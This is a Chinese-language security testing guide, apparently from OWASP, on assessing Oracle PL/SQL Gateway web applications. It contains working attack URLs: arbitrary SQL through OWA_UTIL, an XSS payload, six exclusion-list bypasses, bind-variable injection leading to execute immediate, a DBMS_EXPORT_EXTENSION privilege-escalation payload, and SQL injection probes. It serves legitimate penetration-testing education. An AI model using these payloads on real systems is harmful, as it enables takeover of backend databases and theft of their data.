# 测试 Oracle

## 概述

基于 Web 的 PL/SQL 应用程序由 PL/SQL 网关启用，该组件负责将 Web 请求转换为数据库查询。Oracle 开发了多种软件实现，从早期的 Web 监听器产品到 Apache `mod_plsql` 模块，再到 XML 数据库（XDB）Web 服务器。每种实现都有其自身的特性和问题，本章将对此进行深入研究。使用 PL/SQL 网关的产品包括但不限于：Oracle HTTP Server、eBusiness Suite、Portal、HTMLDB、WebDB 和 Oracle Application Server。

## 如何测试

### PL/SQL 网关的工作原理

本质上，PL/SQL 网关仅充当代理服务器，接收用户的 Web 请求并将其传递给数据库服务器执行。

1. Web 服务器接受来自 Web 客户端的请求，并确定是否应由 PL/SQL 网关处理。
2. PL/SQL 网关通过提取请求的包名、过程和变量来处理请求。
3. 请求的包和过程被封装在一个匿名 PL/SQL 块中，并发送到数据库服务器。
4. 数据库服务器执行该过程，并将结果以 HTML 形式返回给网关。
5. 网关通过 Web 服务器将响应发送回客户端。

理解这一点很重要——PL/SQL 代码并不存在于 Web 服务器上，而是存在于数据库服务器中。这意味着 PL/SQL 网关或 PL/SQL 应用程序中的任何弱点在被利用时，都会让攻击者直接访问数据库服务器；任何防火墙都无法阻止这一点。

PL/SQL Web 应用程序的 URL 通常很容易识别，并且通常以以下开头（xyz 可以是任何字符串，代表数据库访问描述符，稍后您将了解更多）：

- `https://www.example.com/pls/xyz`
- `https://www.example.com/xyz/owa`
- `https://www.example.com/xyz/plsql`

虽然后两个示例代表旧版本 PL/SQL 网关的 URL，但第一个来自在 Apache 上运行的较新版本。在 plsql.conf Apache 配置文件中，/pls 是默认值，指定为 Location，以 PLS 模块作为处理程序。但是，该位置不必是 /pls。URL 中缺少文件扩展名可能表明存在 Oracle PL/SQL 网关。考虑以下 URL：

`https://www.server.com/aaa/bbb/xxxxx.yyyyy`

如果 `xxxxx.yyyyy` 被替换为诸如 `ebank.home`、`store.welcome`、`auth.login` 或 `books.search` 之类的内容，则很有可能是使用了 PL/SQL 网关。也可以在请求的包和过程之前加上拥有它的用户的名称——即模式——在这种情况下，用户是 `webuser`：

`https://www.server.com/pls/xyz/webuser.pkg.proc`

在此 URL 中，xyz 是数据库访问描述符（DAD）。DAD 指定有关数据库服务器的信息，以便 PL/SQL 网关可以连接。它包含诸如 TNS 连接字符串、用户 ID 和密码、认证方法等信息。这些 DAD 在较新版本中在 `dads.conf` Apache 配置文件中指定，或在旧版本中在 `wdbsvr.app` 文件中指定。一些默认的 DAD 包括以下：

```txt
SIMPLEDAD
HTMLDB
ORASSO
SSODAD
PORTAL
PORTAL2
PORTAL30
PORTAL30_SSO
TEST
DAD
APP
ONLINE
DB
OWA
```

#### 确定 PL/SQL 网关是否正在运行

在对服务器进行评估时，首先重要的是了解您实际处理的是什么技术。如果您还不知道，例如在黑盒评估场景中，那么您需要做的第一件事就是弄清楚这一点。识别基于 Web 的 PL/SQL 应用程序相当容易。首先，URL 的格式及其外观，如上所述。除此之外，还可以执行一组简单的测试来检测 PL/SQL 网关的存在。

#### NULL 测试

在 PL/SQL 中，`null` 是完全可接受的表达式：

```sql
SQL> BEGIN
  NULL;
  END;
  /
PL/SQL procedure successfully completed.
```

我们可以使用它来测试服务器是否运行 PL/SQL 网关。只需使用 `DAD` 并追加 `NULL`，然后追加 `NOSUCHPROC`：

- `https://www.example.com/pls/dad/null`
- `https://www.example.com/pls/dad/nosuchproc`

如果服务器对第一个响应 `200 OK`，对第二个响应 `404 Not Found`，则表明服务器正在运行 PL/SQL 网关。

#### 已知包访问

在旧版本的 PL/SQL 网关中，可以直接访问构成 PL/SQL Web 工具包的包，如 OWA 和 HTP 包。其中一个包是 `OWA_UTIL` 包，我们稍后将详细介绍。该包包含一个名为 SIGNATURE 的过程，它只是在 HTML 中输出一个 PL/SQL 签名。因此请求

`https://www.example.com/pls/dad/owa_util.signature`

会在网页上返回以下输出：

`"This page was produced by the PL/SQL Web Toolkit on date"`

或

`"This page was produced by the PL/SQL Cartridge on date"`

如果您没有收到此响应，而是收到 403 Forbidden 响应，则可以推断 PL/SQL 网关正在运行。这是您在较新版本或已修补系统中应获得的响应。

#### 访问数据库中的任意 PL/SQL 包

有可能利用数据库服务器中默认安装的 PL/SQL 包中的漏洞。如何利用取决于 PL/SQL 网关的版本。在早期版本的 PL/SQL 网关中，没有任何措施可以阻止攻击者访问数据库服务器中的任意 PL/SQL 包。我们之前提到了 `OWA_UTIL` 包。这可用于运行任意 SQL 查询：

`https://www.example.com/pls/dad/OWA_UTIL.CELLSPRINT? P_THEQUERY=SELECT+USERNAME+FROM+ALL_USERS`

跨站脚本攻击可以通过 HTP 包发起：

`https://www.example.com/pls/dad/HTP.PRINT?CBUF=<script>alert('XSS')</script>`

显然，这是危险的，因此 Oracle 引入了 PLSQL 排除列表以防止直接访问此类危险过程。禁止的项目包括任何以 `SYS.*` 开头的请求、任何以 `DBMS_*` 开头的请求、任何带有 `HTP.*` 或 `OWA*` 的请求。然而，有可能绕过排除列表。此外，排除列表并不能阻止访问 `CTXSYS` 和 `MDSYS` 模式或其他模式中的包，因此可以利用这些包中的缺陷：

`https://www.example.com/pls/dad/CXTSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL`

如果数据库服务器仍然存在此缺陷（CVE-2006-0265），这将返回一个空白 HTML 页面，并带有 200 OK 响应。

### 测试 PL/SQL 网关的缺陷

多年来，Oracle PL/SQL 网关存在许多缺陷，包括访问管理页面（CVE-2002-0561）、缓冲区溢出（CVE-2002-0559）、目录遍历漏洞，以及允许攻击者绕过排除列表并进而访问和执行数据库服务器中任意 PL/SQL 包的漏洞。

### 绕过 PL/SQL 排除列表

Oracle 试图修复允许攻击者绕过排除列表的缺陷的次数令人难以置信。Oracle 发布的每个补丁都成为新绕过技术的受害者。[这段不幸历史的故事](https://seclists.org/fulldisclosure/2006/Feb/11)

### 绕过排除列表 - 方法 1

当 Oracle 首次引入 PL/SQL 排除列表以防止攻击者访问任意 PL/SQL 包时，可以通过在模式/包名称前加上十六进制编码的换行符、空格或制表符来轻松绕过：

```txt
https://www.example.com/pls/dad/%0ASYS.PACKAGE.PROC
https://www.example.com/pls/dad/%20SYS.PACKAGE.PROC
https://www.example.com/pls/dad/%09SYS.PACKAGE.PROC
```

### 绕过排除列表 - 方法 2

较新版本的网关允许攻击者通过在模式/包名称前加上标签来绕过排除列表。在 PL/SQL 中，标签指向可以使用 GOTO 语句跳转的代码行，并采用以下形式：`<<NAME>>`

- `https://www.example.com/pls/dad/<<LBL>>SYS.PACKAGE.PROC`

### 绕过排除列表 - 方法 3

简单地将模式/包名称放在双引号中可以允许攻击者绕过排除列表。请注意，这在 Oracle Application Server 10g 上不起作用，因为它会在将用户请求发送到数据库服务器之前将其转换为小写，而带引号的文字是区分大小写的——因此 `SYS` 和 `sys` 不同，对后者的请求将导致 404 Not Found。但在早期版本中，以下可以绕过排除列表：

`https://www.example.com/pls/dad/"SYS".PACKAGE.PROC`

### 绕过排除列表 - 方法 4

根据 Web 服务器和数据库服务器上使用的字符集，某些字符会被转换。因此，根据使用的字符集，`ÿ` 字符（`0xFF`）可能在数据库服务器上被转换为 `Y`。另一个经常转换为大写 `Y` 的字符是长音符号 - `0xAF`。这可能允许攻击者绕过排除列表：

`https://www.example.com/pls/dad/S%FFS.PACKAGE.PROC`
`https://www.example.com/pls/dad/S%AFS.PACKAGE.PROC`

### 绕过排除列表 - 方法 5

某些版本的 PL/SQL 网关允许使用反斜杠 - `0x5C` 绕过排除列表：

`https://www.example.com/pls/dad/%5CSYS.PACKAGE.PROC`

### 绕过排除列表 - 方法 6

这是绕过排除列表的最复杂方法，也是最近修补的方法。如果我们请求以下内容：

`https://www.example.com/pls/dad/foo.bar?xyz=123`

应用服务器将在数据库服务器上执行以下操作：

```sql
declare
 rc__ number;
 start_time__ binary_integer;
 simple_list__ owa_util.vc_arr;
 complex_list__ owa_util.vc_arr;
begin
 start_time__ := dbms_utility.get_time;
 owa.init_cgi_env(:n__, :nm__, :v__);
 htp.HTBUF_LEN := 255;
 null;
 null;
 simple_list__(1) := 'sys.%';
 simple_list__(2) := 'dbms\_%';
 simple_list__(3) := 'utl\_%';
 simple_list__(4) := 'owa\_%';
 simple_list__(5) := 'owa.%';
 simple_list__(6) := 'htp.%';
 simple_list__(7) := 'htf.%';
 if ((owa_match.match_pattern('foo.bar', simple_list__, complex_list__, true))) then
  rc__ := 2;
 else
  null;
  orasso.wpg_session.init();
  foo.bar(XYZ=>:XYZ);
  if (wpg_docload.is_file_download) then
   rc__ := 1;
   wpg_docload.get_download_file(:doc_info);
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
  else
   rc__ := 0;
   orasso.wpg_session.deinit();
   null;
   null;
   commit;
   owa.get_page(:data__, :ndata__);
  end if;
 end if;
 :rc__ := rc__;
 :db_proc_time__ := dbms_utility.get_time—start_time__;
end;
```

注意第 19 行和第 24 行。在第 19 行，用户的请求根据已知的“坏”字符串列表进行检查，即排除列表。如果请求的包和过程不包含坏字符串，则第 24 行执行该过程。XYZ 参数作为绑定变量传递。

如果我们随后请求以下内容：

`https://server.example.com/pls/dad/INJECT'POINT`

则执行以下 PL/SQL：

```sql
..
simple_list__(7) := 'htf.%';
if ((owa_match.match_pattern('inject'point', simple_list__ complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 inject'point;
..
```

这会在错误日志中产生错误：“PLS-00103: Encountered the symbol ‘POINT’ when expecting one of the following. . .” 这里我们有一种注入任意 SQL 的方法。这可以被利用来绕过排除列表。首先，攻击者需要找到一个不带参数且与排除列表中任何内容都不匹配的 PL/SQL 过程。有很多默认包符合此标准，例如：

```txt
JAVA_AUTONOMOUS_TRANSACTION.PUSH
XMLGEN.USELOWERCASETAGNAMES
PORTAL.WWV_HTP.CENTERCLOSE
ORASSO.HOME
WWC_VERSION.GET_HTTP_DATABASE_INFO
```

攻击者应选择目标系统上实际可用（即请求时返回 `200 OK`）的这些函数之一。作为测试，攻击者可以请求：

`https://server.example.com/pls/dad/orasso.home?FOO=BAR`

服务器应返回 `404 File Not Found` 响应，因为 orasso.home 过程不需要参数，但已提供了一个。然而，在返回 404 之前，执行了以下 PL/SQL：

```sql
..
..
if ((owa_match.match_pattern('orasso.home', simple_list__, complex_list__, true))) then
 rc__ := 2;
else
 null;
 orasso.wpg_session.init();
 orasso.home(FOO=>:FOO);
..
..
```

注意攻击者查询字符串中 FOO 的存在。攻击者可以利用这一点运行任意 SQL。首先，他们需要关闭括号：

`https://server.example.com/pls/dad/orasso.home?);--=BAR`

这将导致执行以下 PL/SQL：

```sql
..
orasso.home();--=>:);--);
..
```

注意双破折号（`--`）后面的所有内容都被视为注释。此请求将导致内部服务器错误，因为其中一个绑定变量不再被使用，因此攻击者需要将其重新添加。碰巧的是，正是这个绑定变量是运行任意 PL/SQL 的关键。目前，他们可以使用 `HTP.PRINT` 打印 BAR，并将所需的绑定变量添加为 :1：

`https://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR`

这应该返回一个包含单词 "BAR" 的 200 响应。这里发生的是等号后面的所有内容——在此例中为 BAR——是插入到绑定变量中的数据。使用相同的技术，也可以再次访问 `owa_util.cellsprint`：

`https://www.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS`

为了执行任意 SQL，包括 DML 和 DDL 语句，攻击者插入 execute immediate :1：

`https://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual`

请注意，输出不会显示。这可以被利用来利用 SYS 拥有的任何 PL/SQL 注入漏洞，从而使攻击者完全控制后端数据库服务器。例如，以下 URL 利用了 `DBMS_EXPORT_EXTENSION` 中的 SQL 注入缺陷：

```txt
https://www.example.com/pls/dad/orasso.home?);
execute%20immediate%20:1;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20
BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('INDEX_NAME','INDEX_SCHEMA','DBMS_OUTPUT.PUT_LINE(:p1); EXECUTE%20IMMEDIATE%20''CREATE%20OR%20REPLACE%20
PUBLIC%20SYNONYM%20BREAKABLE%20FOR%20SYS.OWA_UTIL'';
END;--','SYS',1,'VER',0);END;
```

### 评估自定义 PL/SQL Web 应用程序

在黑盒安全评估期间，自定义 PL/SQL 应用程序的代码不可用，但仍然需要评估其安全漏洞。

#### 测试 SQL 注入

每个输入参数都应测试 SQL 注入缺陷。这些很容易发现和确认。发现它们就像在参数中嵌入一个单引号并检查错误响应（包括 404 Not Found 错误）一样简单。确认 SQL 注入的存在可以使用连接运算符执行。

例如，假设有一个书店 PL/SQL Web 应用程序，允许用户按作者搜索书籍：

`https://www.example.com/pls/bookstore/books.search?author=DICKENS`

如果此请求返回 Charles Dickens 的书籍，但

`https://www.example.com/pls/bookstore/books.search?author=DICK'ENS`

返回错误或 `404`，则可能存在 SQL 注入缺陷。这可以通过使用连接运算符来确认：

`https://www.example.com/pls/bookstore/books.search?author=DICK'||'ENS`

如果此请求返回 Charles Dickens 的书籍，则您已确认存在 SQL 注入漏洞。
